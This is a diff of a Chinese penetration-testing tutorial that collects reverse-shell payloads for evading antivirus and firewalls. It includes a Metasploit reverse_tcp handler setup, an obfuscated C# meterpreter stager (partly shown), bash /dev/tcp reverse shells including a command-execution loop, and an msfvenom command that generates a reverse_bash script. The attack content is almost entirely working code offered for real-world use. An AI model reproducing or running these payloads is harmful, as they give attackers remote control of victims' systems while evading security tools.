@@ -1,14 +1,11 @@
-专注APT攻击与防御
-https://micropoor.blogspot.com/
+在实战中可能会遇到各种诉求 payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。
 
-在实战中可能会遇到各种诉求payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。
-
-这次主要补充了C\#，Bash
+这次主要补充了 C#，Bash
 
 ps:在线代码高亮：http://tool.oschina.net/highlight
 
-**1.C#-payload**
-```
+### 1、C#-payload
+```bash
 msf > use exploit/multi/handler
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp 
 payload => windows/meterpreter/reverse_tcp
@@ -17,7 +14,7 @@ LHOST => 192.168.1.107
 ```
 
 混淆：
-``` c#
+```c#
 using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices; using System.
 namespace RkfCHtll { class LiNGeDokqnEH {
 static byte[] idCWVw(string VVUUJUQytjlL, int eMcukOUqFuHbUv) {
@@ -58,21 +55,27 @@ WaitForSingleObject(IntPtr CApwDwK, UInt32 uzGJUddCYTd);
 ![](media/926b5570b97743dcfdc212edb6604589.jpg)
 
 
-**1.Bash-payload**
-`i >& /dev/tcp/xx.xx.xx.xx/xx 0>&1`
-![](media/49ee03061e17179d4022d4fc02df4da6.jpg)
-```
+### 2、Bash-payload
+```bash
+i >& /dev/tcp/xx.xx.xx.xx/xx 0>&1
+```  
+![](media/49ee03061e17179d4022d4fc02df4da6.jpg)  
+
+```bash
 exec 5<>/dev/tcp/xx.xx.xx.xx/xx
 cat <&5 | while read line; do $line 2>&5 >&5;done
-```
+```  
 ![](media/9b61ec08224188e6d2e172a47df7861a.jpg)
 
-附录：
-msfvenom 生成bash
-`root@John:~# msfvenom -p cmd/unix/reverse_bash LHOST=xx.xx..xx.xx LPORT=xx > -f raw > payload.sh`
+### 附录：
+msfvenom 生成 bash
+```bash
+root@John:~# msfvenom -p cmd/unix/reverse_bash LHOST=xx.xx..xx.xx LPORT=xx > -f raw > payload.sh
+```
 
 参数简化
-项目地址：https://github.com/g0tmi1k/mpc
+项目地址：  
+https://github.com/g0tmi1k/mpc  
 ![](media/4b4fa44f7174bc8361028253fefead0e.jpg)
 
 >   Micropoor
